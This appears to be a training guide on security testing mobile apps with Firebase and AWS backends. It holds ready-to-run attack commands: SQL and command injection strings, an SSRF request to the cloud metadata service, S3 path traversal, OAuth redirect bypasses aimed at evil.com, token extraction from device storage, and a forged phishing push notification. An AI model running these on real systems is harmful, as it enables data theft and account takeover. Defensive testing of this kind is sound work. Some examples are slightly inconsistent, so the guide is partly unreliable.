# Mobile Cloud Integration Security Testing

## Learning Objectives

Master security testing for mobile applications that integrate with cloud backends (Firebase, AWS Amplify), including cloud service misconfiguration, OAuth 2.0/OIDC mobile implementation flaws, and third-party SDK security assessment.

---

## 1. Firebase Security

### 1.1 Firestore Rules Audit

Firestore security rules control access to documents and collections. Misconfigured rules are one of the most common Firebase vulnerabilities.

**Common Misconfigurations**:

```bash
# Step 1: Extract Firebase project configuration from the mobile app
# React Native
grep -n "firebaseConfig\|apiKey\|projectId\|appId" index.android.bundle | head -20

# Flutter
strings libapp.so | grep -E "AIza[0-9A-Za-z_-]{35}" -A2 -B2

# Android native
grep -rn "google-services.json\|google_app_id\|firebase_database_url" app_source/res/values/
cat app_source/assets/google-services.json 2>/dev/null | python3 -m json.tool

# Step 2: Identify the Firebase project ID
# Extract from: projectId, firebaseDatabaseUrl, or storageBucket
# Format: https://<project-id>.firebaseio.com
# Format: <project-id>.appspot.com

# Step 3: Test Firestore rules using the Firebase REST API
PROJECT_ID="target-project-123"

# Test unauthenticated read access
curl "https://firestore.googleapis.com/v1/projects/$PROJECT_ID/databases/(default)/documents/users" 2>/dev/null | python3 -m json.tool

# Test unauthenticated write access
curl -X POST "https://firestore.googleapis.com/v1/projects/$PROJECT_ID/databases/(default)/documents/users" \
  -H "Content-Type: application/json" \
  -d '{"fields":{"name":{"stringValue":"test"},"email":{"stringValue":"test@test.com"}}}'

# Test specific document access
curl "https://firestore.googleapis.com/v1/projects/$PROJECT_ID/databases/(default)/documents/users/USER_ID"
```

**Insecure Rules Patterns to Check**:

```
# Pattern 1: Allow all reads/writes (most dangerous)
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    match /{document=**} {
      allow read, write: if true;    // VULNERABLE: open access
    }
  }
}

# Pattern 2: Allow all authenticated users (no ownership check)
match /users/{userId} {
  allow read, write: if request.auth != null;  // VULNERABLE: any authenticated user
}

# Pattern 3: Missing document ownership check
match /users/{userId} {
  allow read, write: if request.auth.uid == userId;  // Correct pattern
}
```

### 1.2 Firebase Realtime Database Exposure

```bash
# Step 1: Construct the database URL
# Format: https://<project-id>.firebaseio.com/.json

PROJECT_ID="target-project-123"

# Step 2: Test unauthenticated read access
curl "https://$PROJECT_ID.firebaseio.com/.json" 2>/dev/null | python3 -m json.tool

# Step 3: Test specific paths
curl "https://$PROJECT_ID.firebaseio.com/users.json"
curl "https://$PROJECT_ID.firebaseio.com/admin.json"
curl "https://$PROJECT_ID.firebaseio.com/config.json"
curl "https://$PROJECT_ID.firebaseio.com/secrets.json"

# Step 4: Test write access
curl -X PUT "https://$PROJECT_ID.firebaseio.com/test_write.json" \
  -d '{"test": "write_access"}'

# Step 5: Check for sensitive data in common paths
for path in users admin config settings secrets tokens passwords emails; do
    status=$(curl -s -o /dev/null -w "%{http_code}" "https://$PROJECT_ID.firebaseio.com/$path.json")
    echo "Path /$path: HTTP $status"
done
```

**Frida: Extract Firebase Configuration at Runtime**:

```javascript
// Hook Firebase initialization to capture config
Java.perform(function() {
    try {
        var FirebaseApp = Java.use("com.google.firebase.FirebaseApp");
        var options = FirebaseApp.getOptions();
        console.log("[+] Firebase Project ID: " + options.getProjectId());
        console.log("[+] Firebase Database URL: " + options.getDatabaseUrl());
        console.log("[+] Firebase Storage Bucket: " + options.getStorageBucket());
    } catch(e) {
        console.log("[-] Firebase config extraction failed: " + e);
    }
});
```

### 1.3 Firebase Storage Bucket Public Access

```bash
# Step 1: Identify the storage bucket
# Format: <project-id>.appspot.com
# Or from the mobile app config: storageBucket field

BUCKET="target-project-123.appspot.com"

# Step 2: Test public list access
curl "https://storage.googleapis.com/storage/v1/b/$BUCKET/o" 2>/dev/null | python3 -m json.tool

# Step 3: Test direct file access
curl -I "https://storage.googleapis.com/$BUCKET/profile_images/user123.jpg"

# Step 4: Test upload access (if rules are misconfigured)
curl -X POST "https://storage.googleapis.com/upload/storage/v1/b/$BUCKET/o?uploadType=media&name=test.txt" \
  -H "Content-Type: text/plain" \
  -d "test upload access"

# Step 5: List all publicly accessible objects
curl "https://storage.googleapis.com/storage/v1/b/$BUCKET/o?maxResults=1000" | python3 -c "
import sys, json
data = json.load(sys.stdin)
for item in data.get('items', []):
    print(item['name'])
" 2>/dev/null
```

### 1.4 Firebase Authentication Bypass Scenarios

```bash
# Scenario 1: Anonymous authentication enabled
# Check if the app allows anonymous login
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=<api_key>" \
  -H "Content-Type: application/json" \
  -d '{"returnSecureToken": true}'

# Scenario 2: Email enumeration via sign-up error
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=<api_key>" \
  -H "Content-Type: application/json" \
  -d '{"email": "admin@target.com", "password": "test123", "returnSecureToken": true}'
# Response: "EMAIL_EXISTS" confirms the email is registered

# Scenario 3: Weak password policy
# Test if Firebase allows weak passwords (minimum 6 chars by default)
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=<api_key>" \
  -H "Content-Type: application/json" \
  -d '{"email": "test@evil.com", "password": "123456", "returnSecureToken": true}'

# Scenario 4: Token theft via insecure storage
# Check if Firebase tokens are stored in plaintext
adb shell "run-as com.target.app cat /data/data/com.target.app/shared_prefs/*.xml" | grep -i "firebase\|token\|refresh"
```

### 1.5 Firebase Cloud Functions Security

```bash
# Step 1: Identify Cloud Functions endpoints
# Look for callable function names in the mobile app
grep -n "functions.httpsCallable\|firebase.functions()" index.android.bundle 2>/dev/null
strings libapp.so | grep -iE "httpsCallable|cloudfunctions" | sort -u

# Step 2: Test function invocation without authentication
curl -X POST "https://us-central1-$PROJECT_ID.cloudfunctions.net/functionName" \
  -H "Content-Type: application/json" \
  -d '{"data": {"test": "value"}}'

# Step 3: Test with stolen token
curl -X POST "https://us-central1-$PROJECT_ID.cloudfunctions.net/functionName" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <stolen_token>" \
  -d '{"data": {"test": "value"}}'

# Common Cloud Functions vulnerabilities:
# - Missing authentication check in function
# - No input validation on data payload
# - Functions that perform privileged operations based on client data
# - Rate limiting not implemented
```

---

## 2. AWS Amplify Mobile Security

### 2.1 AppSync API Exposure

```bash
# Step 1: Extract AppSync configuration from mobile app
# Look for aws-exports.js, amplifyconfiguration.json
grep -rn "aws_appsync_graphqlEndpoint\|graphqlEndpoint" app_source/
unzip -p app.apk assets/amplifyconfiguration.json 2>/dev/null | python3 -m json.tool

# Step 2: Test AppSync endpoint without authentication
APPSYNC_URL="https://xxx.appsync-api.us-east-1.amazonaws.com/graphql"

curl -X POST "$APPSYNC_URL" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}'

# Step 3: Test with API key (if API key auth is enabled)
curl -X POST "$APPSYNC_URL" \
  -H "Content-Type: application/json" \
  -H "x-api-key: <extracted_api_key>" \
  -d '{"query": "{ listUsers { items { id email name } } }"}'

# Step 4: Test with stolen JWT (if Cognito auth is enabled)
curl -X POST "$APPSYNC_URL" \
  -H "Content-Type: application/json" \
  -H "Authorization: <stolen_jwt>" \
  -d '{"query": "{ listAdmins { items { id email permissions } } }"}'
```

### 2.2 Cognito User Pool Misconfiguration

```bash
# Step 1: Extract Cognito configuration
# Look for aws_user_pools_id, aws_user_pools_web_client_id
grep -rn "cognito\|user_pools\|UserPoolId\|ClientId" app_source/res/ app_source/assets/ 2>/dev/null

# Step 2: Test user registration without verification
USER_POOL_ID="us-east-1_xxxxx"
CLIENT_ID="xxxxx"

# Attempt signup
aws cognito-idp sign-up \
  --client-id $CLIENT_ID \
  --username "attacker@evil.com" \
  --password "TestPass123!" \
  --region us-east-1

# Step 3: Test for user enumeration
# Signup response reveals if user exists
aws cognito-idp sign-up \
  --client-id $CLIENT_ID \
  --username "admin@target.com" \
  --password "TestPass123!" \
  --region us-east-1
# Error: "User already exists" = user enumeration confirmed

# Step 4: Test password reset for any user
aws cognito-idp forgot-password \
  --client-id $CLIENT_ID \
  --username "victim@target.com" \
  --region us-east-1

# Step 5: Check for MFA bypass
aws cognito-idp initiate-auth \
  --client-id $CLIENT_ID \
  --auth-flow USER_PASSWORD_AUTH \
  --auth-parameters USERNAME="test@test.com",PASSWORD="TestPass123!" \
  --region us-east-1
```

**Common Cognito Misconfigurations**:

| Misconfiguration | Risk | Detection |
|------------------|------|-----------|
| No MFA enforcement | Account takeover | Test auth without MFA |
| Weak password policy | Brute force | Test signup with weak passwords |
| No account lockout | Credential stuffing | Multiple failed login attempts |
| Client secret not required | Unauthorized API access | Check if CLIENT_SECRET is needed |
| Admin creation via API | Privilege escalation | Test signup with admin attributes |

### 2.3 S3 Bucket Access from Mobile

```bash
# Step 1: Extract S3 bucket configuration
grep -rn "aws_user_files_s3_bucket\|S3Bucket\|s3Bucket" app_source/

# Step 2: Test bucket access
BUCKET_NAME="target-app-uploads-123"

# List bucket contents (if publicly accessible)
aws s3 ls s3://$BUCKET_NAME/ --no-sign-request 2>/dev/null

# Direct URL access
curl -I "https://$BUCKET_NAME.s3.amazonaws.com/"

# Test for path traversal in upload
curl -X PUT "https://$BUCKET_NAME.s3.amazonaws.com/../../etc/passwd" \
  -H "Content-Type: text/plain" \
  -d "test"
```

### 2.4 Lambda Invocation from Mobile Apps

```bash
# Step 1: Identify Lambda function names from mobile app
grep -rn "lambda\|Lambda\|functionName" app_source/ | grep -i invoke

# Step 2: Extract API Gateway endpoint
grep -rn "aws_cloud_logic_custom\|apiGateway\|endpoint" app_source/

# Step 3: Test Lambda invocation via API Gateway
API_URL="https://xxx.execute-api.us-east-1.amazonaws.com/prod"

# Test without authentication
curl "$API_URL/users"

# Test with manipulated parameters
curl "$API_URL/admin/users" -H "Authorization: Bearer <user_token>"

# Test injection in Lambda parameters
curl -X POST "$API_URL/search" \
  -H "Content-Type: application/json" \
  -d '{"query": "test; DROP TABLE users;--"}'
```

---

## 3. OAuth 2.0/OIDC Mobile Implementation Flaws

### 3.1 Authorization Code Interception (PKCE Bypass)

```bash
# PKCE (Proof Key for Code Exchange) is essential on mobile
# Test if the OAuth implementation requires PKCE

# Step 1: Extract OAuth configuration from mobile app
grep -rn "authorization_endpoint\|token_endpoint\|client_id\|redirect_uri" index.android.bundle 2>/dev/null
strings libapp.so | grep -E "authorize\|token\|callback\|redirect" | sort -u

# Step 2: Initiate OAuth flow without PKCE
# If server accepts auth request without code_challenge, PKCE is not enforced
curl "https://auth.target.com/authorize?response_type=code&client_id=<client_id>&redirect_uri=appscheme://callback&scope=openid+profile"

# Step 3: If PKCE is enforced, test code_verifier reuse
# PKCE requires a unique code_verifier per request
# Test if the same code_verifier can be reused for multiple token exchanges

# Step 4: Test code_challenge_method downgrade
# S256 is required; test if "plain" is accepted
curl "https://auth.target.com/authorize?client_id=<client_id>&redirect_uri=appscheme://callback&code_challenge=plain_text_verifier&code_challenge_method=plain"
```

### 3.2 Redirect URI Manipulation

```bash
# Step 1: Identify registered redirect URIs
grep -rn "redirect_uri\|redirectUrl\|callback" index.android.bundle 2>/dev/null

# Step 2: Test redirect URI validation
# Common bypass techniques:

# Bypass 1: Open redirect via path traversal
curl "https://auth.target.com/authorize?client_id=<id>&redirect_uri=appscheme://callback.evil.com&response_type=code"

# Bypass 2: Subdomain bypass
curl "https://auth.target.com/authorize?client_id=<id>&redirect_uri=https://evil.target.com/callback&response_type=code"

# Bypass 3: Fragment injection
curl "https://auth.target.com/authorize?client_id=<id>&redirect_uri=appscheme://callback#@evil.com&response_type=code"

# Bypass 4: URL encoding tricks
curl "https://auth.target.com/authorize?client_id=<id>&redirect_uri=appscheme%3A%2F%2Fcallback%2F%2Fevil.com&response_type=code"
```

### 3.3 Token Storage on Device

```bash
# Check all token storage locations on the device

# Android: SharedPreferences
adb shell "run-as com.target.app cat /data/data/com.target.app/shared_prefs/*.xml" | grep -iE "token|access_token|refresh_token|id_token|auth"

# Android: SQLite databases
adb shell "run-as com.target.app sqlite3 /data/data/com.target.app/databases/*.db 'SELECT * FROM tokens;'" 2>/dev/null

# Android: Internal storage
adb shell "run-as com.target.app ls -la /data/data/com.target.app/files/" 2>/dev/null

# React Native: AsyncStorage
adb shell "run-as com.target.app cat /data/data/com.target.app/databases/RKStorage" | strings | grep -iE "token|auth"
```

**Secure vs Insecure Token Storage**:

| Storage Method | Platform | Security Level |
|----------------|----------|----------------|
| SharedPreferences (plaintext) | Android | INSECURE - root access exposes tokens |
| AsyncStorage | React Native | INSECURE - plaintext SQLite |
| Keychain (kSecAttrAccessible) | iOS | SECURE - hardware-backed |
| Android Keystore + EncryptedFile | Android | SECURE - hardware-backed |
| flutter_secure_storage | Flutter | SECURE - uses platform Keystore/Keychain |
| Encrypted SharedPreferences | Android | SECURE - encrypted with AES256 |

### 3.4 Implicit Flow Vulnerabilities on Mobile

```bash
# Implicit flow returns tokens directly in the URL fragment
# This is deprecated for mobile apps but still found in legacy implementations

# Step 1: Check if implicit flow is used
grep -rn "response_type=token\|response_type=id_token\|implicit" index.android.bundle 2>/dev/null

# Step 2: If implicit flow is detected, test token exposure vectors:
# - Browser history (if opened in browser)
# - Referer header (if app navigates to external URLs)
# - Custom URL scheme interception (if scheme is not unique)
# - Server access logs (if URL is logged)

# Step 3: Test for token replay
curl -H "Authorization: Bearer <implicit_token>" https://api.target.com/user/profile
```

### 3.5 Custom URL Scheme Hijacking

```bash
# Step 1: Identify custom URL schemes used by the app
grep -A3 "<intent-filter>" app_source/AndroidManifest.xml | grep "android:scheme"

# Step 2: Test if another app can register the same scheme
# Create a test APK that handles the same scheme
# If the malicious APK is installed, it can intercept OAuth callbacks

# Step 3: Verify scheme uniqueness
# Common insecure schemes: myapp://, app://, callback://
# Secure approach: Use verified app links (Android) / universal links (iOS)

# Android App Links verification
grep -rn "android:autoVerify=\"true\"" app_source/AndroidManifest.xml
# If autoVerify is not set, the scheme can be hijacked

# iOS Universal Links verification
plutil -p Payload/App.app/Info.plist | grep -A5 "AssociatedDomains"
# If no associated domains are configured, custom schemes are vulnerable
```

**Custom URL Scheme Attack Flow**:

```
1. Identify target app's custom URL scheme (e.g., targetapp://)
2. Create malicious app registering the same scheme
3. Victim installs malicious app (social engineering)
4. Victim initiates OAuth login in target app
5. Browser redirects to targetapp://callback?code=AUTH_CODE
6. Android prompts user to choose which app handles the URL
7. If victim selects malicious app, auth code is stolen
8. Attacker exchanges auth code for access token
```

---

## 4. Backend API Integration Testing

### 4.1 API Gateway Security Assessment

```bash
# Step 1: Identify API Gateway endpoint from mobile app
grep -rn "execute-api\|api.*amazonaws.com\|api.*cloudfunctions.net" app_source/

# Step 2: Test authentication bypass
API_GW="https://xxx.execute-api.us-east-1.amazonaws.com/prod"

# Test without authentication
curl "$API_GW/users" -v

# Test with manipulated JWT claims
curl "$API_GW/admin/dashboard" \
  -H "Authorization: Bearer <modified_jwt_with_admin_role>"

# Step 3: Test rate limiting
for i in $(seq 1 100); do
    curl -s -o /dev/null -w "%{http_code}\n" "$API_GW/users"
done | sort | uniq -c

# Step 4: Test CORS configuration
curl -H "Origin: https://evil.com" -I "$API_GW/users"
# Check for Access-Control-Allow-Origin: *
```

### 4.2 Serverless Function Invocation from Mobile

```bash
# Step 1: Identify serverless function endpoints
# Look for function URLs, API paths, and event triggers

# Step 2: Test direct invocation
aws lambda invoke \
  --function-name target-function \
  --payload '{"key": "value"}' \
  response.json

# Step 3: Test function-level vulnerabilities
# Injection in function parameters
curl -X POST "$API_GW/process" \
  -H "Content-Type: application/json" \
  -d '{"input": "test; cat /etc/passwd"}'

# Test for SSRF in functions that fetch URLs
curl -X POST "$API_GW/fetch" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/"}'

# Test for privilege escalation
curl -X POST "$API_GW/user/update" \
  -H "Authorization: Bearer <token>" \
  -d '{"userId": "victim_id", "role": "admin"}'
```

### 4.3 Third-Party SDK Vulnerability Assessment

```bash
# Step 1: Enumerate all SDKs in the mobile app

# Android: Check build.gradle dependencies
cat app_source/build.gradle 2>/dev/null | grep -E "implementation|api|compile"

# Android: Check lib directory for .so files
ls -la app_source/lib/*/ | awk '{print $NF}'

# React Native: Check package.json equivalents in bundle
grep -oE '"@[a-z-]+/[a-z-]+"' index.android.bundle | sort -u

# Flutter: Check plugin list
strings libapp.so | grep -oE "package:[a-z_.]+" | sort -u

# Step 2: Assess each SDK for security issues
# Common SDK categories with security concerns:
# - Analytics SDKs: Excessive data collection, ID leakage
# - Ad SDKs: Location tracking, device fingerprinting
# - Social login SDKs: Token handling, scope abuse
# - Payment SDKs: PCI compliance, data exposure
# - Crash reporting SDKs: Sensitive data in crash logs

# Step 3: Test SDK data transmission
# Use proxy to monitor all outgoing requests from each SDK
# Look for:
# - PII sent without encryption
# - Data sent to unexpected endpoints
# - Unique device identifiers sent for tracking
# - Authentication tokens shared across SDKs
```

**SDK Security Checklist**:

| Check | Description | Tool |
|-------|-------------|------|
| Data collection scope | What data does the SDK collect? | Burp Suite traffic analysis |
| Network endpoints | Where does data get sent? | Proxy log review |
| Permission usage | Does the SDK request unnecessary permissions? | Manifest analysis |
| Token handling | How does the SDK store auth tokens? | Frida runtime hooks |
| Certificate pinning | Does the SDK pin its own certificates? | SSL bypass test |
| Version currency | Is the SDK version up to date? | Dependency check |

### 4.4 Push Notification Security

```bash
# Step 1: Identify push notification service
# Android: FCM (Firebase Cloud Messaging)
grep -rn "firebase_messaging\|FCM\|cloud_messaging" app_source/

# iOS: APNs (Apple Push Notification service)
plutil -p Payload/App.app/Info.plist | grep -A2 "Push"

# Step 2: Test FCM token extraction
# FCM tokens are stored in SharedPreferences
adb shell "run-as com.target.app cat /data/data/com.target.app/shared_prefs/*.xml" | grep -i "fcm\|token\|push"

# Step 3: Test unauthorized push notification sending
FCM_TOKEN="<extracted_device_token>"
SERVER_KEY="<extracted_server_key>"

curl -X POST "https://fcm.googleapis.com/fcm/send" \
  -H "Authorization: key=$SERVER_KEY" \
  -H "Content-Type: application/json" \
  -d "{
    \"to\": \"$FCM_TOKEN\",
    \"notification\": {
      \"title\": \"Security Alert\",
      \"body\": \"Your account has been compromised. Click to verify.\",
      \"click_action\": \"OPEN_URL\"
    },
    \"data\": {
      \"url\": \"https://evil.com/phishing\"
    }
  }"

# Step 4: Test push notification data handling
# Common issues:
# - Opening arbitrary URLs from push data
# - Executing actions based on push data without verification
# - Displaying push content without sanitization (XSS in WebView)
```

**Push Notification Attack Scenarios**:

| Attack | Description | Impact |
|--------|-------------|--------|
| Phishing via push | Send fake security alerts with phishing links | Credential theft |
| Deep link injection | Trigger app actions via push data | Unauthorized actions |
| XSS in notification | Inject script if notification rendered in WebView | Data exfiltration |
| Token theft | Extract FCM/APNs token from device | Targeted notification spam |
| Server key exposure | Extract FCM server key from APK | Mass notification sending |

---

## 5. Testing Methodology

### 5.1 Mobile Cloud Integration Testing Flow

```
1. Cloud Configuration Extraction
   |-> Extract Firebase/AWS/Backend config from mobile app
   |-> Identify cloud endpoints and services
   |-> Map authentication mechanisms
   |
2. Cloud Service Misconfiguration Testing
   |-> Test Firebase rules (Firestore, Realtime DB, Storage)
   |-> Test AWS resource exposure (AppSync, Cognito, S3)
   |-> Check for public access to cloud resources
   |
3. Authentication Flow Testing
   |-> Test OAuth 2.0/OIDC implementation on mobile
   |-> Verify PKCE enforcement
   |-> Test redirect URI validation
   |-> Check token storage security
   |
4. API Integration Testing
   |-> Test API gateway security
   |-> Test serverless function invocation
   |-> Assess third-party SDK security
   |-> Test push notification handling
   |
5. Report & Document
   |-> All exposed cloud resources
   |-> Authentication bypass findings
   |-> SDK privacy and security issues
   |-> Remediation recommendations
```

### 5.2 Cloud Service Exposure Priority

| Priority | Test | Why |
|----------|------|-----|
| 1 | Firebase Realtime DB public access | Immediate data exposure |
| 2 | Firestore rules | Data read/write without auth |
| 3 | S3 bucket public access | File exfiltration |
| 4 | Cognito misconfiguration | Account takeover |
| 5 | OAuth implementation flaws | Auth bypass |
| 6 | SDK data collection | Privacy violations |
| 7 | Push notification handling | Social engineering |

---

## 6. Tool Reference

| Tool | Purpose | Command |
|------|---------|---------|
| **Firebase Scanner** | Automated Firebase misconfig detection | Custom script or Baserunner |
| **aws-cli** | AWS service interaction | `aws cognito-idp sign-up ...` |
| **Burp Suite** | API traffic interception | Proxy + match-replace rules |
| **Frida** | Runtime config extraction | `frida -U -f com.target.app -l hook.js` |
| **S3Scanner** | S3 bucket enumeration | `python3 s3scanner.py bucket_name` |
| **nuclei** | Automated vulnerability scanning | `nuclei -t firebase/ -u target` |

---

## References

- [Firebase Security Rules Documentation](https://firebase.google.com/docs/rules) - Official rules syntax and patterns
- [OWASP Mobile Testing - Cloud](https://owasp.org/www-project-mobile-security-testing-guide/) - Mobile cloud testing guidance
- [AWS Amplify Security](https://docs.amplify.aws/lib/project-setup/prereq/q/platform/android/) - Amplify security configuration
- [OAuth 2.0 for Mobile Apps (RFC 8252)](https://datatracker.ietf.org/doc/html/rfc8252) - Best practices for OAuth on mobile
- [HackTricks - Firebase](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/buckets/firebase) - Firebase exploitation techniques
